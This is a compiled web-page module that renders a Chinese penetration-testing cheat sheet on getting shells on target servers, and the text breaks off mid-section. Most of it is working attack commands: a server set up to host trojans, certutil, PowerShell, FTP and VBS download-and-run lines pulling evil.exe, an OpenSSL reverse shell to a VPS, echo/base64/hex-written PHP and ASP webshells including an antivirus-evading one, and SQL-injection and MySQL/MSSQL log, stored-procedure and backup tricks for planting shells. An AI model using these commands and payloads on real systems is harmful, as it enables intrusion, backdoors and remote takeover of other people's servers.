import{_ as d}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as u,c as k,d as p,w as a,a as s,b as n,e as o,r as c}from"./app.c527752f.js";const m={},v=o(`<h2 id="搭建用于下载木马的服务器" tabindex="-1"><a class="header-anchor" href="#搭建用于下载木马的服务器" aria-hidden="true">#</a> 搭建用于下载木马的服务器</h2><h4 id="nginx" tabindex="-1"><a class="header-anchor" href="#nginx" aria-hidden="true">#</a> Nginx</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-o</span> /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
<span class="token function">curl</span> <span class="token parameter variable">-o</span> /etc/yum.repos.d/epel.repo http://mirrors.cloud.tencent.com/repo/epel-7.repo
yum clean all<span class="token punctuation">;</span>yum makecache
yum <span class="token parameter variable">-y</span> <span class="token function">install</span> nginx
<span class="token comment">#默认目录在 /usr/share/nginx/html</span>
systemctl start nginx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> Python</h4>`,4),b=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[n("python "),s("span",{class:"token parameter variable"},"-m"),n(" SimpleHTTPServer "),s("span",{class:"token number"},"8080"),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"})])],-1),h=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[n("python "),s("span",{class:"token parameter variable"},"-m"),n(" http.server "),s("span",{class:"token number"},"80"),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"})])],-1),g=s("h2",{id:"目标出网getshell",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#目标出网getshell","aria-hidden":"true"},"#"),n(" 目标出网Getshell")],-1),y=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token function"},"wget"),n(" http://127.0.0.1/123.txt "),s("span",{class:"token parameter variable"},"-O"),n(),s("span",{class:"token number"},"123"),n(`.txt
`),s("span",{class:"token function"},"curl"),n(),s("span",{class:"token parameter variable"},"-o"),n(" out.txt http://127.0.0.1/123.txt "),s("span",{class:"token comment"},"#保存到文件"),n(`
`),s("span",{class:"token function"},"curl"),n(),s("span",{class:"token parameter variable"},"-O"),n(" http://127.0.0.1/123.zip		 "),s("span",{class:"token comment"},"#下载文件"),n(`

`),s("span",{class:"token comment"},"###  VPS监听"),n(`
`),s("span",{class:"token comment"},"#先生成自签名证书"),n(`
openssl req `),s("span",{class:"token parameter variable"},"-x509"),n(),s("span",{class:"token parameter variable"},"-newkey"),n(" rsa:2048 "),s("span",{class:"token parameter variable"},"-keyout"),n(" key.pem "),s("span",{class:"token parameter variable"},"-out"),n(" cert.pem "),s("span",{class:"token parameter variable"},"-days"),n(),s("span",{class:"token number"},"365"),n(),s("span",{class:"token parameter variable"},"-nodes"),n(`

`),s("span",{class:"token comment"},"#使用 OpenSSL 监听一个端口"),n(`
openssl s_server `),s("span",{class:"token parameter variable"},"-quiet"),n(),s("span",{class:"token parameter variable"},"-key"),n(" key.pem "),s("span",{class:"token parameter variable"},"-cert"),n(" cert.pem "),s("span",{class:"token parameter variable"},"-port"),n(),s("span",{class:"token number"},"8080"),n(`

`),s("span",{class:"token comment"},"#目标机进行反弹 shell"),n(`
`),s("span",{class:"token function"},"mkfifo"),n(" /tmp/s"),s("span",{class:"token punctuation"},";"),n(" /bin/sh "),s("span",{class:"token parameter variable"},"-i"),n(),s("span",{class:"token operator"},"<"),n(" /tmp/s "),s("span",{class:"token operator"},[s("span",{class:"token file-descriptor important"},"2"),n(">")]),s("span",{class:"token file-descriptor important"},"&1"),n(),s("span",{class:"token operator"},"|"),n(" openssl s_client "),s("span",{class:"token parameter variable"},"-quiet"),n(),s("span",{class:"token parameter variable"},"-connect"),n(" VPS-IP:8080 "),s("span",{class:"token operator"},">"),n(" /tmp/s"),s("span",{class:"token punctuation"},";"),n(),s("span",{class:"token function"},"yes"),n(),s("span",{class:"token operator"},"|"),n(),s("span",{class:"token function"},"rm"),n(` /tmp/s
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),w=s("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[s("pre",{class:"language-powershell"},[s("code",null,[n("certutil "),s("span",{class:"token operator"},"-"),n("urlcache "),s("span",{class:"token operator"},"-"),n("split "),s("span",{class:"token operator"},"-"),n("f http:"),s("span",{class:"token operator"},"/"),s("span",{class:"token operator"},"/"),n("10"),s("span",{class:"token punctuation"},"."),n("0"),s("span",{class:"token punctuation"},"."),n("1"),s("span",{class:"token punctuation"},"."),n("1/npc"),s("span",{class:"token punctuation"},"."),n("exe C:\\Users\\Public\\Videos\\setup"),s("span",{class:"token punctuation"},"."),n(`exe
certutil `),s("span",{class:"token operator"},"-"),n("urlcache "),s("span",{class:"token operator"},"-"),n("split "),s("span",{class:"token operator"},"-"),n("f http:"),s("span",{class:"token operator"},"/"),s("span",{class:"token operator"},"/"),n("10"),s("span",{class:"token punctuation"},"."),n("0"),s("span",{class:"token punctuation"},"."),n("1"),s("span",{class:"token punctuation"},"."),n("1/npc"),s("span",{class:"token punctuation"},"."),n("exe  delete	"),s("span",{class:"token comment"},"#清缓存"),n(`

powershell `),s("span",{class:"token punctuation"},"("),s("span",{class:"token function"},"new-object"),n(" System"),s("span",{class:"token punctuation"},"."),n("Net"),s("span",{class:"token punctuation"},"."),n("WebClient"),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},"."),n("DownloadFile"),s("span",{class:"token punctuation"},"("),s("span",{class:"token string"},"'http://192.168.28.128/imag/evil.txt'"),s("span",{class:"token punctuation"},","),s("span",{class:"token string"},"'evil.exe'"),s("span",{class:"token punctuation"},")"),n(`

`),s("span",{class:"token comment"},"#如果装有ftp可以用这种方法bypass杀软"),n(`
`),s("span",{class:"token function"},"echo"),n(" open VPS-IP > o&"),s("span",{class:"token function"},"echo"),n(" user anonymous >> o& "),s("span",{class:"token function"},"echo"),n(" asc >>o&"),s("span",{class:"token function"},"echo"),n(" prompt >>o&"),s("span",{class:"token function"},"echo"),n(" mget 123"),s("span",{class:"token punctuation"},"."),n("txt >> o &"),s("span",{class:"token function"},"echo"),n(" quit >> o &ftp "),s("span",{class:"token operator"},"-"),n("n "),s("span",{class:"token operator"},"-"),n("s:o &"),s("span",{class:"token function"},"del"),n(),s("span",{class:"token operator"},"/"),n("F "),s("span",{class:"token operator"},"/"),n(`Q o

IEExec`),s("span",{class:"token punctuation"},"."),n("exe http:"),s("span",{class:"token operator"},"/"),s("span",{class:"token operator"},"/"),n("192"),s("span",{class:"token punctuation"},"."),n("168"),s("span",{class:"token punctuation"},"."),n("28"),s("span",{class:"token punctuation"},"."),n("131/evil"),s("span",{class:"token punctuation"},"."),n(`exe

`),s("span",{class:"token comment"},"#VBS脚本"),n(`
`),s("span",{class:"token function"},"echo"),n(),s("span",{class:"token function"},"set"),n(" a=createobject"),s("span",{class:"token punctuation"},"("),n("^"),s("span",{class:"token string"},'"adod^"'),s("span",{class:"token operator"},"+"),n("^"),s("span",{class:"token string"},'"b.stream^"'),s("span",{class:"token punctuation"},")"),n(":"),s("span",{class:"token function"},"set"),n(" w=createobject"),s("span",{class:"token punctuation"},"("),n("^"),s("span",{class:"token string"},'"micro^"'),s("span",{class:"token operator"},"+"),n("^"),s("span",{class:"token string"},'"soft.xmlhttp^"'),s("span",{class:"token punctuation"},")"),n(":w"),s("span",{class:"token punctuation"},"."),n("open^"),s("span",{class:"token string"},'"get^"'),s("span",{class:"token punctuation"},","),n("wsh"),s("span",{class:"token punctuation"},"."),n("arguments"),s("span",{class:"token punctuation"},"("),n("0"),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},","),n("0:w"),s("span",{class:"token punctuation"},"."),n("send:a"),s("span",{class:"token punctuation"},"."),s("span",{class:"token function"},"type"),n("=1:a"),s("span",{class:"token punctuation"},"."),n("open:a"),s("span",{class:"token punctuation"},"."),s("span",{class:"token function"},"write"),n(" w"),s("span",{class:"token punctuation"},"."),n("responsebody:a"),s("span",{class:"token punctuation"},"."),n("savetofile wsh"),s("span",{class:"token punctuation"},"."),n("arguments"),s("span",{class:"token punctuation"},"("),n("1"),s("span",{class:"token punctuation"},")"),s("span",{class:"token punctuation"},","),n("2  >> downfile"),s("span",{class:"token punctuation"},"."),n(`vbs

cscript downfile`),s("span",{class:"token punctuation"},"."),n("vbs http:"),s("span",{class:"token operator"},"/"),s("span",{class:"token operator"},"/"),n("192"),s("span",{class:"token punctuation"},"."),n("168"),s("span",{class:"token punctuation"},"."),n("203"),s("span",{class:"token punctuation"},"."),n("140/a"),s("span",{class:"token punctuation"},"."),n("ps1 D:\\\\tomcat8"),s("span",{class:"token punctuation"},"."),n("5\\\\webapps\\\\x"),s("span",{class:"token punctuation"},"."),n(`ps1
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),f=s("h2",{id:"目标不出网getshell",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#目标不出网getshell","aria-hidden":"true"},"#"),n(" 目标不出网Getshell")],-1),x=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token comment"},"#echo 写shell"),n(`
`),s("span",{class:"token comment"},"#直接写入"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},"'<?php eval($_POST[1]); ?>'"),n(),s("span",{class:"token operator"},">"),n(),s("span",{class:"token number"},"1"),n(`.php

`),s("span",{class:"token comment"},"#base64写入"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},'"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="'),n(),s("span",{class:"token operator"},"|"),n(" base64 "),s("span",{class:"token parameter variable"},"-d"),n(),s("span",{class:"token operator"},">"),s("span",{class:"token number"},"2"),n(`.php

`),s("span",{class:"token comment"},"#绕过重定向载荷"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},'"ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA="'),n(),s("span",{class:"token operator"},"|"),n(" base64 "),s("span",{class:"token parameter variable"},"-d"),n(),s("span",{class:"token operator"},"|"),n(),s("span",{class:"token function"},"bash"),n(`

`),s("span",{class:"token comment"},"#hex写入"),n(`
https://www.107000.com/T-Hex/
`),s("span",{class:"token builtin class-name"},"echo"),n(" 3C3F706870206576616C28245F504F53545B315D293B203F3E"),s("span",{class:"token operator"},"|"),n("xxd "),s("span",{class:"token parameter variable"},"-r"),n(),s("span",{class:"token parameter variable"},"-ps"),n(),s("span",{class:"token operator"},">"),n(),s("span",{class:"token number"},"5"),n(`.php

`),s("span",{class:"token comment"},"#cat写shell"),n(`
`),s("span",{class:"token function"},"cat"),n(),s("span",{class:"token operator"},">>"),n(" xxx.jsp "),s("span",{class:"token operator"},"<<"),s("span",{class:"token string"},`EOF
xxx马子内容
EOF`),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),_=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token builtin class-name"},"echo"),n(" ^"),s("span",{class:"token operator"},"<"),n("?php @eval"),s("span",{class:"token punctuation"},"("),s("span",{class:"token variable"},"$_POST"),s("span",{class:"token punctuation"},"["),s("span",{class:"token number"},"6"),s("span",{class:"token punctuation"},"]"),s("span",{class:"token punctuation"},")"),n("?^"),s("span",{class:"token operator"},">"),n(),s("span",{class:"token operator"},">"),n(" D:"),s("span",{class:"token punctuation"},"\\"),n("wwwroot"),s("span",{class:"token punctuation"},"\\"),n(`x.php
`),s("span",{class:"token comment"},"#此处 ^ 起转义作用"),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),q=o('<div class="custom-container tip"><p class="custom-container-title">提示</p><p>如果是jar包部署的不出网就只能打内存马了</p></div><h2 id="查找网站目录" tabindex="-1"><a class="header-anchor" href="#查找网站目录" aria-hidden="true">#</a> 查找网站目录</h2><div class="custom-container tip"><p class="custom-container-title">黑盒方式</p><p>1、Web页面报错信息</p><p>2、字典爆破</p><p>3、旁站的目录</p></div>',3),S={class:"custom-container info"},E=s("p",{class:"custom-container-title"},"可执行系统命令的方式（查找文件）",-1),C=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token function"},"find"),n(" / "),s("span",{class:"token parameter variable"},"-name"),n(` xx.php
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"})])],-1),A=s("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[s("pre",{class:"language-powershell"},[s("code",null,[s("span",{class:"token function"},"dir"),n(),s("span",{class:"token operator"},"/"),n("s "),s("span",{class:"token operator"},"*"),s("span",{class:"token punctuation"},"."),n(`jsp
`),s("span",{class:"token keyword"},"for"),n(),s("span",{class:"token operator"},"/"),n("r C:\\ "),s("span",{class:"token operator"},"%"),n("i in "),s("span",{class:"token punctuation"},"("),n("urls"),s("span",{class:"token punctuation"},"."),s("span",{class:"token operator"},"*"),s("span",{class:"token punctuation"},")"),n(),s("span",{class:"token keyword"},"do"),n(" @"),s("span",{class:"token function"},"echo"),n(),s("span",{class:"token operator"},"%"),n(`i
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),P=o('<h2 id="mysql数据库写shell" tabindex="-1"><a class="header-anchor" href="#mysql数据库写shell" aria-hidden="true">#</a> MySQL数据库写shell</h2><details class="custom-container details"><summary>利用条件</summary><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行。</p><p>1、数据库当前为root用户-dba权限</p><p>2、知道网站目录绝对路径</p><p>3、PHP的GPC为off状态（魔术引号 POST、GET、Cookie）</p><p>4、写入路径拥有写权限</p></details><div class="custom-container tip"><p class="custom-container-title">代替空格的方法</p><p>+号，%0a、%0b、%a0 、 /**/ 注释符等</p></div><h4 id="outfile和dumpfile的区别" tabindex="-1"><a class="header-anchor" href="#outfile和dumpfile的区别" aria-hidden="true">#</a> outfile和dumpfile的区别？</h4>',4),L=s("div",{class:"language-http line-numbers-mode","data-ext":"http"},[s("pre",{class:"language-http"},[s("code",null,`1、支持多行数据同时导出
2、使用联合查询时要保证两侧查询的列数相同
3、会在换行符制表符后追加反斜杠 "\\"
4、会在末尾追加行
`)]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),T=s("div",{class:"language-http line-numbers-mode","data-ext":"http"},[s("pre",{class:"language-http"},[s("code",null,`1、每次只能导出一行数据
2、不会在换行符制表符后追加反斜杠
3、不会在末尾追加行
`)]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),R=o(`<p>因此，我们可以使用dumpfile这个函数来顺利写入二进制文件;</p><p>当然outfile函数也可以写入二进制文件，只是无法生效（追加的反斜杠会使二进制文件无法生效）</p><p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制</p><h3 id="基于union联合查询" tabindex="-1"><a class="header-anchor" href="#基于union联合查询" aria-hidden="true">#</a> 基于UNION联合查询</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:\\www\\info.php&#39;</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&#39;C:\\www\\info.php&#39;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="非联合查询" tabindex="-1"><a class="header-anchor" href="#非联合查询" aria-hidden="true">#</a> 非联合查询</h3><p>当我们无法使用联合查询时，我们可以使用 fields terminated by与 lines terminated by来写shell</p><p>字段终止于</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:\\info.php&#39;</span> <span class="token keyword">FIELDS</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="基于日志写shell" tabindex="-1"><a class="header-anchor" href="#基于日志写shell" aria-hidden="true">#</a> 基于日志写Shell</h3><details class="custom-container details"><summary>突破secure-file-priv写shell</summary><p>secure-file-priv参数是用来限制导入|导出目录的；</p><p>当secure_file_priv没有具体值时，表示不对MySQL的导入|导出做限制，null表示不允许导入导出。</p><p>而且在mysql 5.6.34版本以后 secure_file_priv 的值默认为NULL。并且无法用SQL语句对其进行修改。</p></details><p>outfile被禁止，或者写入文件被拦截，没写权限 ，有root权限的情况下可以用日志写shell。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">&#39;%general%&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--开启日志监测，默认关闭(如果一直开文件会很大的)</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token keyword">on</span><span class="token punctuation">;</span>

<span class="token comment">--设置日志路径</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">&#39;/var/www/html/info.php&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--执行查询，写入shell</span>
<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token string">&quot;&lt;?php $sl = create_function(&#39;&#39;, @$_REQUEST[&#39;admin&#39;]);$sl();?&gt;&quot;</span><span class="token punctuation">;</span> <span class="token comment">--免杀shell</span>

<span class="token comment">--结束后，恢复日志路径，关闭日志监测</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="慢查询写shell" tabindex="-1"><a class="header-anchor" href="#慢查询写shell" aria-hidden="true">#</a> 慢查询写shell</h3><p>开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错，这时候可以用慢查询。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--查看慢查询信息</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">&#39;%slow_query_log%&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--启用慢查询日志(默认禁用)</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>

<span class="token comment">--修改日志文件路径</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">&#39;C:\\\\phpStudy\\\\WWW\\\\shell.php&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--写入Shell</span>
<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><details class="custom-container details"><summary>慢查询补充</summary><p>只有当查询语句执行时间超过系统默认的10秒,该语句才会被记入进慢查询日志</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">&#39;%long_query_time%&#39;</span><span class="token punctuation">;</span>
<span class="token comment">--查看服务器默认时间值</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="mssql数据库写shell" tabindex="-1"><a class="header-anchor" href="#mssql数据库写shell" aria-hidden="true">#</a> MSSQL数据库写shell</h2><p>MSSQL就是微软的SQL Server数据库。</p><details class="custom-container details"><summary>利用条件</summary><ol><li>有dba权限</li><li>知道web目录的绝对路径</li></ol></details><h3 id="用存储过程搜索绝对路径" tabindex="-1"><a class="header-anchor" href="#用存储过程搜索绝对路径" aria-hidden="true">#</a> 用存储过程搜索绝对路径</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">EXEC</span> xp_dirtree <span class="token string">&#39;c:&#39;</span> <span class="token comment">--列出所有c:\\文件、目录、子目录 </span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment">--只列c:\\目录</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment">--列c:\\目录、文件</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>写webshell</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- 首先判断当前是否为DBA权限，为1则可以提权</span>
<span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">&#39;sysadmin&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 利用存储过程写入一句话,注意路径</span>
<span class="token keyword">declare</span> <span class="token variable">@o</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@f</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@t</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@ret</span> <span class="token keyword">int</span>
<span class="token keyword">exec</span> sp_oacreate <span class="token string">&#39;scripting.filesystemobject&#39;</span><span class="token punctuation">,</span> <span class="token variable">@o</span> <span class="token keyword">out</span>
<span class="token keyword">exec</span> sp_oamethod <span class="token variable">@o</span><span class="token punctuation">,</span> <span class="token string">&#39;createtextfile&#39;</span><span class="token punctuation">,</span> <span class="token variable">@f</span> <span class="token keyword">out</span><span class="token punctuation">,</span> <span class="token string">&#39;C:\\www\\test.asp&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">exec</span> <span class="token variable">@ret</span> <span class="token operator">=</span> sp_oamethod <span class="token variable">@f</span><span class="token punctuation">,</span> <span class="token string">&#39;writeline&#39;</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;%execute(request(&quot;a&quot;))%&gt;&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="xp-cmdshell拿shell" tabindex="-1"><a class="header-anchor" href="#xp-cmdshell拿shell" aria-hidden="true">#</a> xp_cmdshell拿Shell</h3><p>这种方法就是cmd来执行系统命令，需要注意转义字符，具体步骤看数据库提权章节中的代码。</p><p><strong>无回显查看命令执行结果</strong></p><div class="language-mssql line-numbers-mode" data-ext="mssql"><pre class="language-mssql"><code>CREATE TABLE tmpTable (tmp1 varchar(8000));
insert into tmpTable(tmp1) exec master..xp_cmdshell &#39;ipconfig&#39;
select * from tmpTable
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="差异备份拿shell" tabindex="-1"><a class="header-anchor" href="#差异备份拿shell" aria-hidden="true">#</a> 差异备份拿shell</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--完整备份一次，保存位置可更改</span>
<span class="token keyword">backup</span> <span class="token keyword">database</span> 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\Users\\Public\\Music\\bak.bak&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--创建表并插入一句话(密码a)</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>test<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span> <span class="token punctuation">[</span>image<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> test<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">0x3C25657865637574652872657175657374282261222929253E</span><span class="token punctuation">)</span>

<span class="token comment">--进行差异备份</span>
<span class="token keyword">backup</span> <span class="token keyword">database</span> 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span><span class="token operator">=</span><span class="token string">&#39;C:\\www\\shell.asp&#39;</span> <span class="token keyword">WITH</span> DIFFERENTIAL<span class="token punctuation">,</span>FORMAT<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当过滤了特殊的字符比如单引号，或者路径符号可以使用定义局部变量来执行</p><h3 id="log备份拿shell" tabindex="-1"><a class="header-anchor" href="#log备份拿shell" aria-hidden="true">#</a> Log备份拿shell</h3><details class="custom-container details"><summary>利用条件</summary><p>LOG 备份需要先把指定的数据库激活为还原模式;</p><p>所以需要执行<code>alter database XXX set RECOVERY FUL</code></p><p>目标机器的数据库备份过，而且选择恢复模式得是完整模式</p><p>但是使用 log 备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式。</p></details><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">alter</span> <span class="token keyword">database</span> 库名 <span class="token keyword">set</span> RECOVERY <span class="token keyword">FULL</span> 
<span class="token keyword">create</span> <span class="token keyword">table</span> cmd <span class="token punctuation">(</span>a image<span class="token punctuation">)</span> 
<span class="token keyword">backup</span> log 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\Users\\Public\\Music&#39;</span> <span class="token keyword">with</span> init 
